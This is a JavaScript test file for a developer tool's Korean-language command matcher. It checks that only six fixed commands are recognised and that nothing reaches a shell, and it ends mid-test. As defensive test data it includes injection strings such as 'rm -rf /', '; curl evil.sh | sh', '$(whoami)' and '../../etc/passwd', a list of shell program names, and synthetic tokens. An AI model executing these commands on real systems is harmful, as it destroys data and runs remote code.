/* WBS-22 · Quick Command rules — `19` §C4, D-106.
 *
 * The corpus below is Canon's, case by case, taken from
 * `JuQode-Private/docs/evidence/planning/q02-q03-quick-command-validation.md`. That document
 * reports 87/87 against a `corpus.json` that lives in a planning scratchpad OUTSIDE both
 * repositories, and it writes down roughly forty of those cases explicitly. Only the ones it
 * writes down are here — a case invented to reach 87 would prove nothing about Canon's corpus.
 * See CANON_FINDINGS CF-12.
 *
 * The negative groups matter most. `19` §C4 is explicit that the product does NOT detect
 * dangerous phrases — it recognises six things and declines everything else — because a product
 * that claims detection teaches the user that whatever it did not flag is safe (q02 §5.7). So
 * the assertions below are not "the danger was caught"; they are "no rule matched, and there is
 * therefore no code path to a shell".
 */
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const R = path.resolve(__dirname, '..');
const { match, normalize, RULES, ruleById } = require(path.join(R, 'app/main/qc/rules.js'));
const { availability, packageManager } = require(path.join(R, 'app/main/qc/availability.js'));

/* One helper for the whole suite — see tests/tmp.js. Eight private copies each cleaned up
 * only in `process.on('exit')`, which a killed run never reaches; the leftovers filled the
 * tmpfs and made the suite flaky in a different place every run. */
const { tempDir } = require(path.join(__dirname, 'tmp.js'));


/** `[phrase, expected]` — expected is a rule id, `unrecognized`, or `['ambiguous', ...readings]`. */
const CORPUS = [
  // ── dev.start (Canon §4 group "dev.start": 띄어쓰기 변형 · 필러 · ㅋㅋ · npm run dev · dev 서버 동의어 · 미리보기 올려줘)
  ['개발 서버 켜줘', 'qc.dev.start'],
  ['개발서버켜줘', 'qc.dev.start'],
  ['개발 서버 좀 켜줘', 'qc.dev.start'],
  ['개발 서버 켜줘!ㅋㅋ', 'qc.dev.start'],
  ['npm run dev', 'qc.dev.start'],
  ['dev 서버', 'qc.dev.start'],
  ['미리보기 올려줘', 'qc.dev.start'],
  ['서버 띄워줘', 'qc.dev.start'],
  ['로컬서버 실행해줘', 'qc.dev.start'],

  // ── dev.stop (Canon: `stop` 동의어 포함)
  ['개발 서버 꺼줘', 'qc.dev.stop'],
  ['서버 멈춰줘', 'qc.dev.stop'],
  ['개발서버 종료해줘', 'qc.dev.stop'],

  // ── build (Canon: `빌드` 단독 · `build 돌려줘` · `npm run build`)
  ['빌드', 'qc.build'],
  ['build 돌려줘', 'qc.build'],
  ['npm run build', 'qc.build'],
  ['빌드 해줘', 'qc.build'],
  ['빌드 한번 돌려봐', 'qc.build'],

  // ── test (Canon: `유닛 테스트 한번 돌려봐` · `test 실행` · `npm test`)
  ['유닛 테스트 한번 돌려봐', 'qc.test'],
  ['test 실행', 'qc.test'],
  ['npm test', 'qc.test'],
  ['테스트 돌려줘', 'qc.test'],
  ['단위테스트 실행해줘', 'qc.test'],

  // ── git.status (Canon: `뭐가 바뀌었어?` · `수정된 파일 확인해줘` — 수정 이 대상어 안에 있어도 잔여물 0)
  ['뭐가 바뀌었어?', 'qc.git.status'],
  ['수정된 파일 확인해줘', 'qc.git.status'],
  ['깃상태', 'qc.git.status'],
  ['git status', 'qc.git.status'],
  ['바뀐 파일 보여줘', 'qc.git.status'],
  ['변경사항', 'qc.git.status'],

  // ── terminal (Canon: `콘솔 열어` · `셸 열어주세요` · `open terminal`)
  ['콘솔 열어', 'qc.terminal.open'],
  ['셸 열어주세요', 'qc.terminal.open'],
  ['open terminal', 'qc.terminal.open'],
  ['터미널 띄워줘', 'qc.terminal.open'],

  // ── ambiguous (Canon §3 — the readings are DETERMINED, and nothing runs)
  ['서버 좀 정리해줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['서버 치워줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['개발 서버 정리', ['ambiguous', 'qc.dev.stop', 'work']],
  ['꺼줘', ['ambiguous', 'qc.dev.stop', 'work']],

  // ── negative.change — 변경 동사가 있으면 QC 가 아니다
  ['파일 고쳐줘', 'unrecognized'],
  ['테스트 추가해줘', 'unrecognized'],
  ['빌드 에러 수정해줘', 'unrecognized'],
  ['package.json 에 dev 추가해줘', 'unrecognized'],

  // ── negative.danger — 자유 문장에서 셸로 가는 코드 경로가 없다
  ['rm -rf 해줘', 'unrecognized'],
  ['전부 지워줘', 'unrecognized'],
  ['node_modules 삭제해줘', 'unrecognized'],
  ['git push --force', 'unrecognized'],
  ['git reset --hard 해줘', 'unrecognized'],
  ['서버 켜줘 && rm -rf /', 'unrecognized'],
  ['sudo npm run dev', 'unrecognized'],
  ['커밋해줘', 'unrecognized'],

  // ── negative.other
  ['배포해줘', 'unrecognized'],
  ['서버 켜고 빌드도 해줘', 'unrecognized'],
  ['서버 다시 켜줘', 'unrecognized'],        // 재시작은 MVP 아님
  ['', 'unrecognized'],
  ['웹서버 켜줘', 'unrecognized'],
  ['npm install', 'unrecognized'],

  // ── Canon's out-of-corpus probes (§4, documented explicitly as expected outcomes)
  ['테스트 서버 켜줘', 'unrecognized'],       // 두 규칙 대상어 충돌 → 어느 쪽도 residue 0 아님
  ['개발 서버 켜줘 (5173 포트로)', 'unrecognized'],  // 옵션 미지원
  ['테스트 실행해서 결과 알려줘', 'unrecognized'],    // 복문
];

test('Canon\'s documented Quick Command corpus', () => {
  const failures = [];
  for (const [phrase, expected] of CORPUS) {
    const r = match(phrase);
    const got = r.kind === 'qc' ? r.id
      : r.kind === 'ambiguous' ? ['ambiguous', ...r.readings]
      : 'unrecognized';
    if (JSON.stringify(got) !== JSON.stringify(expected)) {
      failures.push(`${JSON.stringify(phrase)} → ${JSON.stringify(got)} (expected ${JSON.stringify(expected)})`);
    }
  }
  assert.deepStrictEqual(failures, [], `${failures.length}/${CORPUS.length} corpus cases disagree with Canon`);
});

test('the corpus actually covers every rule and every branch', () => {
  /* A corpus that happened to exercise one rule would pass the test above and prove nothing.
   * This is the check that the check is real. */
  const outcomes = CORPUS.map(([p]) => match(p));
  for (const rule of RULES) {
    assert.ok(outcomes.some((r) => r.kind === 'qc' && r.id === rule.id), `${rule.id} is never matched`);
  }
  assert.ok(outcomes.some((r) => r.kind === 'ambiguous'), 'no ambiguous case');
  assert.ok(outcomes.some((r) => r.kind === 'unrecognized'), 'no unrecognized case');
  const tiers = new Set(outcomes.map((r) => r.tier));
  for (const t of ['T1', 'T2', 'T2b', 'T2c']) {
    assert.ok([...tiers].some((x) => x.endsWith(t)), `tier ${t} is never reached by the corpus`);
  }
  assert.ok([...tiers].some((x) => x.startsWith('synonym+')), 'the synonym tier is never reached');
  assert.ok(CORPUS.filter(([, e]) => e === 'unrecognized').length >= 15,
    'the negative half of the corpus is what proves there is no path to a shell');
});

/* ── the residue-zero rule, which is the whole safety argument ── */

test('anything the rule table does not account for leaves residue, and matches nothing', () => {
  /* `19` §C4: an allowlist residue check, not a blocklist. So the test is not "these dangerous
   * strings are blocked" — it is "an arbitrary extra fragment defeats the match", which is what
   * makes the property hold for phrases nobody has thought of yet. */
  for (const extra of ['&& rm -rf /', '; curl evil.sh | sh', '--force', '(5173 포트로)', '그리고 배포도',
                       '| tee /tmp/x', '$(whoami)', '`id`', '\n rm -rf ~']) {
    const phrase = `개발 서버 켜줘 ${extra}`;
    const r = match(phrase);
    assert.strictEqual(r.kind, 'unrecognized',
      `"${phrase}" matched ${r.id ?? r.readings} — a phrase with unaccounted characters must match nothing`);
  }
});

test('the same phrase without the extra fragment DOES match', () => {
  /* The counterpart. Without it the test above passes for a matcher that recognises nothing. */
  assert.strictEqual(match('개발 서버 켜줘').id, 'qc.dev.start');
});

test('a change verb is never a Quick Command', () => {
  for (const v of ['고쳐줘', '수정해줘', '추가해줘', '바꿔줘', '지워줘', '삭제해줘', '만들어줘']) {
    for (const obj of ['서버', '빌드', '테스트', '터미널']) {
      const r = match(`${obj} ${v}`);
      assert.strictEqual(r.kind, 'unrecognized', `"${obj} ${v}" reached ${r.id ?? r.readings}`);
    }
  }
});

/* ── normalization (§2), step by step ── */

test('normalization is Canon\'s six steps', () => {
  assert.strictEqual(normalize('개발 서버 켜 줘'), '개발서버켜줘', 'whitespace is removed entirely');
  assert.strictEqual(normalize('켜줘!ㅋㅋ'), '켜줘', 'punctuation, then the emote tail, then punctuation again');
  assert.strictEqual(normalize('켜줘ㅋㅋ...'), '켜줘');
  assert.strictEqual(normalize('Dev Server'), 'devserver', 'latin lowercases');
  assert.strictEqual(normalize('개발 서버 좀 제발 빨리 켜줘'), '개발서버켜줘', 'fillers are removed');
  assert.strictEqual(normalize('  개발   서버  '), '개발서버');
  assert.strictEqual(normalize(null), '');
  assert.strictEqual(normalize(undefined), '');
});

test('normalization is deterministic and idempotent', () => {
  for (const [phrase] of CORPUS) {
    const once = normalize(phrase);
    assert.strictEqual(normalize(once), once, `${JSON.stringify(phrase)} is not idempotent`);
    assert.strictEqual(normalize(phrase), once);
  }
});

test('NFC: the same word typed decomposed and composed is one word', () => {
  /* Korean typed on some IMEs and pasted from some sources arrives decomposed (NFD). Without
   * step 1 those are different strings and one of them matches nothing. */
  const composed = '개발 서버 켜줘';
  const decomposed = composed.normalize('NFD');
  assert.notStrictEqual(composed, decomposed, 'the fixture must actually differ before normalization');
  assert.strictEqual(normalize(decomposed), normalize(composed));
  assert.strictEqual(match(decomposed).id, 'qc.dev.start');
});

/* ── ambiguity (§3) — nothing runs, and both readings are named ── */

test('a bare verb is ALWAYS ambiguous, never a quiet choice', () => {
  for (const v of ['돌려줘', '켜줘', '꺼줘']) {
    const r = match(v);
    assert.strictEqual(r.kind, 'ambiguous', `"${v}" chose ${r.id} without asking`);
    assert.ok(r.readings.length >= 2, `"${v}" offered ${r.readings.length} reading(s)`);
  }
  assert.deepStrictEqual(match('돌려줘').readings, ['qc.dev.start', 'qc.build', 'qc.test']);
  assert.deepStrictEqual(match('켜줘').readings, ['qc.dev.start', 'qc.terminal.open']);
});

test('a one-candidate bare verb still offers `work` as the other reading', () => {
  /* §3 case B: "1개뿐이면 `[id, work]`". A verb with no object does not name its target, so the
   * product asks rather than guessing — even when only one rule could have meant it. */
  assert.deepStrictEqual(match('꺼줘').readings, ['qc.dev.stop', 'work']);
});

test('정리/치워 is two readings, and the other one is a Work', () => {
  /* §3 case C. "서버를 정리한다" is either stopping the running server or tidying the server
   * CODE — and tidying code changes files, which is a Work, not a Quick Command. */
  const r = match('서버 좀 정리해줘');
  assert.strictEqual(r.kind, 'ambiguous');
  assert.deepStrictEqual(r.readings, ['qc.dev.stop', 'work']);
  /* …and with no Quick Command object at all there is nothing to be ambiguous ABOUT. */
  assert.strictEqual(match('정리해줘').kind, 'unrecognized');
});

/* ── the rule set is closed ── */

test('there are exactly the six rules `20` has a foreign key for', () => {
  const schema = fs.readFileSync(path.join(R, 'app/main/db/schema.sql'), 'utf8');
  /* The statement is one line of `('a'),('b'),…;` — read to the semicolon, not to the first
   * closing paren, or this counts one rule and passes for the wrong reason. */
  const stmt = /insert into quick_command_rule values([^;]*);/.exec(schema);
  assert.ok(stmt, 'the schema no longer seeds quick_command_rule at all');
  const declared = [...stmt[1].matchAll(/'([^']+)'/g)].map((x) => x[1]);
  assert.strictEqual(declared.length, 6, 'the schema no longer declares six rules');
  assert.deepStrictEqual(RULES.map((r) => r.id).sort(), declared.sort(),
    'the rule table and the schema disagree — a seventh rule cannot be added in one place alone');
});

test('no rule is `write` class — `19` §C4 keeps those out of the MVP', () => {
  for (const r of RULES) {
    assert.ok(['read', 'run'].includes(r.risk), `${r.id} is risk=${r.risk}`);
  }
});

test('exactly one rule is long-running, and it names its stop rule', () => {
  const long = RULES.filter((r) => r.kind === 'long_running');
  assert.strictEqual(long.length, 1);
  assert.strictEqual(long[0].id, 'qc.dev.start');
  assert.strictEqual(long[0].stopRule, 'qc.dev.stop');
  assert.ok(ruleById(long[0].stopRule), 'the stop rule it names does not exist');
});

/* ── availability (project_condition) ── */

function project(files = {}) {
  const dir = tempDir('juqode-qc-');
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), body);
  }
  return dir;
}
const pkg = (scripts) => JSON.stringify({ name: 'x', scripts }, null, 2);

test('a project with no package.json says so, and does not invent a command', () => {
  const root = project({});
  for (const id of ['qc.dev.start', 'qc.build', 'qc.test']) {
    const a = availability(id, { root });
    assert.strictEqual(a.available, false);
    assert.strictEqual(a.reason, 'no_package_json');
    assert.ok(!a.data.command, `${id} produced a command anyway: ${a.data.command}`);
  }
});

test('a missing script is `no_script`, never a guessed command', () => {
  const root = project({ 'package.json': pkg({ lint: 'eslint .' }) });
  assert.strictEqual(availability('qc.dev.start', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.test', { root }).reason, 'no_script');
});

test('dev falls back to start, then serve, and says which it chose', () => {
  /* `19` §C4: 어느 것을 골랐는지 설명에 그대로 적는다 — a user whose `start` script does
   * something else entirely has to see that before it runs. */
  const withStart = project({ 'package.json': pkg({ start: 'node server.js' }) });
  const a = availability('qc.dev.start', { root: withStart });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.script, 'start');
  assert.strictEqual(a.data.command, 'npm run start');
  assert.strictEqual(a.data.scriptBody, 'node server.js', 'the actual script body is shown');

  const withServe = project({ 'package.json': pkg({ serve: 'vite preview' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withServe }).data.script, 'serve');

  const withAll = project({ 'package.json': pkg({ dev: 'vite', start: 'node s.js', serve: 'x' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withAll }).data.script, 'dev', 'dev wins');
});

test('npm\'s placeholder test script is 사용 불가, not a run', () => {
  const body = 'echo "Error: no test specified" && exit 1';
  const root = project({ 'package.json': pkg({ test: body }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'placeholder_script');
  assert.strictEqual(a.data.scriptBody, body, 'the user is entitled to see what is in their file');
  assert.ok(!a.data.command, 'the placeholder must not produce a runnable command');
});

test('a real test script runs', () => {
  const root = project({ 'package.json': pkg({ test: 'node --test' }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'npm run test');
});

test('an already-running dev server is `already_running` with its pid', () => {
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  const devServer = { pid: 4242, startedAt: '2026-01-01T00:00:00.000Z', command: 'npm run dev' };
  const a = availability('qc.dev.start', { root, devServer });
  assert.strictEqual(a.reason, 'already_running');
  assert.strictEqual(a.data.pid, 4242);
});

test('stopping a server JuQode did not start is `not_running`', () => {
  /* `19` §C4: JuQode 밖에서 켠 서버는 JuQode 가 끄지 않는다. The handle is the only thing that
   * makes a stop legitimate — signalling a pid nobody recorded is signalling a stranger. */
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  assert.strictEqual(availability('qc.dev.stop', { root }).reason, 'not_running');
  const a = availability('qc.dev.stop', { root, devServer: { pid: 4242, startedAt: 't', command: 'npm run dev' } });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.pid, 4242);
});

test('git status needs a git repo, and its command is fixed and read-only', () => {
  const plain = project({ 'package.json': pkg({}) });
  assert.strictEqual(availability('qc.git.status', { root: plain }).reason, 'not_git');

  const repo = project({ 'package.json': pkg({}), '.git/HEAD': 'ref: refs/heads/main\n' });
  const a = availability('qc.git.status', { root: repo });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'git status --porcelain=v1 --branch',
    'the command is FIXED — nothing the user typed reaches it');
  assert.strictEqual(a.data.readOnly, true);
});

test('the terminal opens with no condition at all', () => {
  /* `19` §C4: 터미널은 package.json 없어도 가능. */
  const a = availability('qc.terminal.open', { root: project({}) });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.reason, null);
  assert.ok(!a.data.command, 'opening the drawer runs no command');
});

test('the package manager comes from the lockfile', () => {
  assert.strictEqual(packageManager(project({ 'pnpm-lock.yaml': '' })), 'pnpm');
  assert.strictEqual(packageManager(project({ 'yarn.lock': '' })), 'yarn');
  assert.strictEqual(packageManager(project({ 'bun.lockb': '' })), 'bun');
  assert.strictEqual(packageManager(project({ 'package-lock.json': '{}' })), 'npm');
  assert.strictEqual(packageManager(project({})), 'npm', 'no lockfile: npm');

  const root = project({ 'package.json': pkg({ build: 'vite build' }), 'pnpm-lock.yaml': '' });
  assert.strictEqual(availability('qc.build', { root }).data.command, 'pnpm run build');
});

test('a malformed package.json is not a package.json we can use', () => {
  const root = project({ 'package.json': '{ not json' });
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_package_json');
});

test('an id outside the closed set is never available', () => {
  const root = project({ 'package.json': pkg({ build: 'x' }) });
  const a = availability('qc.rm.rf', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'unknown_rule');
});

test('every command that exists comes from the project or is fixed', () => {
  /* The property that matters: no command string is ever assembled from user text. Each one is
   * either `<pm> run <script-name-from-a-closed-list>` or a literal. */
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });
  const allowed = new Set(['npm run dev', 'npm run build', 'npm run test',
                           'git status --porcelain=v1 --branch']);
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.command) continue;
    assert.ok(allowed.has(a.data.command), `${rule.id} produced an unexpected command: ${a.data.command}`);
  }
});

/* ───────── execution — `19` §C4's safety contract (Q-03) ───────── */

const run = require(path.join(R, 'app/main/qc/run.js'));

test('there is no shell — a metacharacter is argument text, not syntax', async () => {
  /* The whole safety argument ends here. Recognition already refuses anything with residue, but
   * this is the last line: `spawn(program, args)` execs the program directly, so even if a
   * command string somehow carried `&&` or `$(…)` there is no interpreter to interpret it. */
  const dir = project({});
  const canary = path.join(dir, 'CANARY');
  const r = run.start({ argv: ['echo', `x && touch ${canary}`, '; rm -rf /', '$(id)', '`id`'], cwd: dir });
  const out = await r.done;

  assert.strictEqual(out.state, 'ok');
  assert.ok(!fs.existsSync(canary), 'a metacharacter in an argument reached a shell');
  assert.ok(out.output.includes('&&'), 'the argument was mangled instead of passed through');
  assert.ok(!out.output.includes('uid='), '$(id) was expanded — something interpreted the argument');
});

test('the exit code is reported as the code, and stderr is not hidden', async () => {
  /* `19` §C4: 종료 코드·stderr 숨기지 않음. `07` §8.1 measured a cancelled child exiting 0, so
   * "it ended" is never read as "it worked". */
  const dir = project({});
  const out = await run.start({ argv: ['sh', '-c', 'echo to-stdout; echo to-stderr >&2; exit 7'], cwd: dir }).done;

  assert.strictEqual(out.state, 'failed');
  assert.strictEqual(out.code, 7);
  assert.ok(out.output.includes('to-stdout'));
  assert.ok(out.output.includes('to-stderr'), 'stderr was dropped — the user cannot see what failed');
});

test('a command that succeeds is `ok`, and one that is signalled is `stopped`', async () => {
  const dir = project({});
  assert.strictEqual((await run.start({ argv: ['sh', '-c', 'exit 0'], cwd: dir }).done).state, 'ok');

  const r = run.start({ argv: ['sh', '-c', 'sleep 30'], cwd: dir, kind: 'long_running' });
  await new Promise((res) => setTimeout(res, 120));
  r.stop();
  const out = await r.done;
  assert.strictEqual(out.state, 'stopped', 'a stopped command was reported as finished');
  assert.ok(out.signal, 'nothing recorded which signal ended it');
});

test('a program that does not exist fails without throwing', async () => {
  const dir = project({});
  const out = await run.start({ argv: ['juqode-no-such-program-xyz'], cwd: dir }).done;
  assert.strictEqual(out.state, 'failed');
  assert.ok(out.spawnError, 'the spawn failure was swallowed');
  assert.strictEqual(out.code, null, 'a program that never ran has no exit code');
});

test('the command runs in the PROJECT root', async () => {
  /* `19` §C4: cwd = 프로젝트 루트. A command that ran somewhere else would report another
   * folder's state under this project's name. */
  const dir = project({ 'marker.txt': 'here\n' });
  const out = await run.start({ argv: ['pwd'], cwd: dir }).done;
  assert.strictEqual(out.output.trim(), fs.realpathSync(dir));
});

test('the environment is the user\'s own, unchanged', async () => {
  /* `19` §C4: env = 사용자 환경 그대로 · 격리 아님. The product does not pretend to sandbox. */
  const dir = project({});
  const out = await run.start({ argv: ['sh', '-c', 'echo "$JUQODE_QC_PROBE"'], cwd: dir,
                                env: { ...process.env, JUQODE_QC_PROBE: 'passed-through' } }).done;
  assert.strictEqual(out.output.trim(), 'passed-through');
});

test('a process handle is kept, with the time that makes the pid meaningful', async () => {
  /* `07` §8.5: a pid is reusable, so a pid alone cannot identify a process later. */
  const dir = project({});
  const r = run.start({ argv: ['sh', '-c', 'sleep 5'], cwd: dir, kind: 'long_running' });
  assert.ok(r.pid > 0);
  assert.ok(Date.parse(r.startedAt) > 0, 'no start time was recorded with the pid');
  r.stop();
  await r.done;
});

test('output is bounded, and the bound is REPORTED', async () => {
  const dir = project({});
  const out = await run.start({ argv: ['sh', '-c', `yes juqode | head -c ${run.OUTPUT_LIMIT * 3}`], cwd: dir }).done;
  assert.ok(Buffer.byteLength(out.output, 'utf8') <= run.OUTPUT_LIMIT,
    `${Buffer.byteLength(out.output, 'utf8')} bytes were kept`);
  assert.strictEqual(out.truncated, true,
    'the output was cut and the card would have shown it as complete');
});

test('the live tail is the last few lines, so a long-running card can show progress', async () => {
  const dir = project({});
  const seen = [];
  const r = run.start({ argv: ['sh', '-c', 'for i in 1 2 3 4 5; do echo line-$i; done'], cwd: dir,
                        onUpdate: (u) => { if (u.state === 'running' && u.tail?.length) seen.push(u.tail); } });
  await r.done;
  const last = seen[seen.length - 1];
  assert.ok(last.length <= run.TAIL_LINES, `the tail carried ${last.length} lines`);
  assert.ok(last[last.length - 1].includes('line-5'), 'the tail is not the LAST lines');
});

/* ───────── masking: a reduction, and the product says so ───────── */

test('token-shaped text is masked in what goes on screen', async () => {
  /* `19` §C4: env 값은 절대 출력하지 않고 표시 계층에 토큰 패턴 가림. The fixture values below
   * are synthetic. */
  const cases = [
    'GITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz',
    'OPENAI_KEY=sk-0123456789abcdefghij',
    'SLACK=xoxb-0123456789-abcdefghij',
    'AWS_ACCESS_KEY_ID=AKIA0123456789ABCDEF',
    'API_KEY: 0123456789abcdef',
  ];
  for (const c of cases) {
    const masked = run.mask(c);
    assert.ok(masked.includes('***'), `nothing was masked in: ${c.split('=')[0]}`);
    assert.ok(!/0123456789/.test(masked), `the value survived masking: ${c.split('=')[0]}`);
  }
});

test('masking is a REDUCTION and the code says so — it is not measured', () => {
  /* q02 §5.6: 가림의 효과는 측정되지 않았다 — 정규식 초안뿐이고 오탐/미탐을 재지 않았다. The
   * product must not treat this as a containment boundary, and a comment claiming it does is
   * the kind of false claim this run keeps finding. This test pins the ADMISSION. */
  const src = fs.readFileSync(path.join(R, 'app/main/qc/run.js'), 'utf8');
  assert.ok(/not measured|UNMEASURED/i.test(src),
    'run.js no longer admits that the masking is unmeasured');

  /* …and it demonstrably does not catch everything, which is why the admission matters. */
  assert.strictEqual(run.mask('the password is hunter2'), 'the password is hunter2');
});

test('masking never turns output into something that reads as clean', async () => {
  const dir = project({});
  const out = await run.start({ argv: ['sh', '-c', 'echo "TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz"'], cwd: dir }).done;
  assert.ok(out.output.includes('***'));
  assert.ok(!out.output.includes('ghp_0123456789'), 'the token reached the card');
});

test('no rule ever hands a command to a shell', () => {
  /* The rule table's argv is the last link in the chain that starts at recognition. Routing any
   * of it through `sh -c` would put an interpreter back between the rule and the OS, and every
   * other guarantee — residue-zero matching, a closed rule set, a fixed command — would then be
   * protecting a string that is about to be parsed again anyway. */
  const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish',
                          'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe']);
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });

  let checked = 0;
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.argv) continue;
    checked += 1;
    const [program, ...args] = a.data.argv;
    assert.ok(!SHELLS.has(path.basename(program)),
      `${rule.id} runs its command through ${program} — that is a shell`);
    /* …and no ARGUMENT smuggles one in either (`-c "…"`). */
    assert.ok(!args.includes('-c'), `${rule.id} passes -c, which is how a shell is handed a script`);
    for (const arg of args) {
      assert.ok(!/[;&|`$><]/.test(arg), `${rule.id} carries a shell metacharacter in an argument: ${arg}`);
    }
  }
  assert.ok(checked >= 4, `only ${checked} rules produced a command — the check ran on almost nothing`);
});

test('the displayed command and the executed argv describe the same thing', () => {
  /* Two representations of one command drift, and the one the user reads is not the one that
   * runs. `19` §C4 requires the explanation to be true of what will happen. */
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.argv) continue;
    assert.strictEqual(a.data.argv.join(' '), a.data.command,
      `${rule.id}: the card says "${a.data.command}" and the spawn runs "${a.data.argv.join(' ')}"`);
  }
});

/* ───────── the drawer's main-process surface — `15` TD-01 · `19` §C4 ───────── */

const { openDb } = require(path.join(R, 'app/main/db/db.js'));
const repo = require(path.join(R, 'app/main/db/repo.js'));
const { makeHandlers } = require(path.join(R, 'app/main/ipc.js'));

function qcBench(files = { 'package.json': pkg({ test: 'node -e "console.log(1)"', build: 'node -e "process.exit(2)"' }) }) {
  const dir = project(files);
  const db = openDb(':memory:');
  const proj = repo.openProject(db, dir, path.basename(dir));
  const pushed = [];
  const h = makeHandlers({ db: () => db, dbFault: () => null, evidenceStore: () => '/tmp/x',
                           push: () => {}, pushQc: (u) => pushed.push(u) });
  return { dir, db, project: proj, h, pushed };
}

test('routing explains and runs NOTHING', () => {
  /* `19` §C4: 항상 설명 후 확인. The explanation is its own round trip, so nothing can be
   * started by typing — only by confirming. */
  const b = qcBench();
  const r = b.h['juqode:qc-route'](null, b.project.id, '테스트 돌려줘');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.route.id, 'qc.test');
  assert.strictEqual(r.available, true);
  assert.strictEqual(r.data.command, 'npm run test');
  /* …and no row exists, because nothing ran (`20` F-12). */
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), []);
});

test('미인식 and 모호함 are cards, not rows', () => {
  const b = qcBench();
  const un = b.h['juqode:qc-route'](null, b.project.id, 'rm -rf 해줘');
  assert.strictEqual(un.route.kind, 'unrecognized');
  assert.ok(!un.rule, 'an unrecognised phrase was given a rule');

  const am = b.h['juqode:qc-route'](null, b.project.id, '서버 좀 정리해줘');
  assert.strictEqual(am.route.kind, 'ambiguous');
  assert.deepStrictEqual(am.route.readings, ['qc.dev.stop', 'work']);
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a card became history');
});

test('an unavailable rule explains WHY and still does not run', () => {
  const b = qcBench({ 'package.json': pkg({}) });          // no scripts at all
  const r = b.h['juqode:qc-route'](null, b.project.id, '빌드 해줘');
  assert.strictEqual(r.route.id, 'qc.build');
  assert.strictEqual(r.available, false);
  assert.strictEqual(r.reason, 'no_script');

  return b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘').then((run) => {
    assert.strictEqual(run.ok, false);
    assert.strictEqual(run.reason, 'unavailable');
    assert.strictEqual(run.detail, 'no_script');
    assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a refused run became history');
  });
});

test('a rule id outside the closed six is refused before anything is looked up', async () => {
  const b = qcBench();
  for (const id of ['qc.rm.rf', 'rm', '', null, 42, '../../etc/passwd']) {
    const r = await b.h['juqode:qc-run'](null, b.project.id, id, 'x');
    assert.strictEqual(r.ok, false, `${JSON.stringify(id)} was accepted`);
    assert.strictEqual(r.reason, 'unknown-rule');
  }
});

test('a run that succeeds becomes a row with its code and its output', async () => {
  const b = qcBench();
  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(started.ok, true);
  assert.ok(started.pid > 0);
  assert.strictEqual(started.command, 'npm run test');

  /* Wait for the push that says it ended, rather than for a clock. */
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });

  const [row] = repo.qcRunsFor(b.db, b.project.id);
  assert.strictEqual(row.rule_id, 'qc.test');
  assert.strictEqual(row.status, 'success');
  assert.strictEqual(row.exit_code, 0);
  assert.strictEqual(row.phrase, '테스트 돌려줘', 'the user\'s own words are what the row is named by');
  assert.ok(row.output_head.includes('1'), 'the output was not kept');
});

test('a run that fails says so, with the code — never as success', async () => {
  /* `07` §8.1 · `19` §C4: 종료 코드 숨기지 않음. */
  const b = qcBench();
  await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
  const [row] = repo.qcRunsFor(b.db, b.project.id);
  assert.strictEqual(row.status, 'failed');
  assert.strictEqual(row.exit_code, 2);
});

test('two Quick Commands cannot run at once in one project', async () => {
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setTimeout(()=>{},5000)"', test: 'node -e "1"' }) });
  const first = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(first.ok, true);
  assert.strictEqual(first.kind, 'long_running');

  const second = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(second.ok, false);
  assert.strictEqual(second.reason, 'already-running');

  /* `20` `qc_status` separates `running` from `long_running`, and `15` TD-01 shows 계속 실행 중
   * for the second — never 완료. The ROW is what a restart reads, so the row has to carry it. */
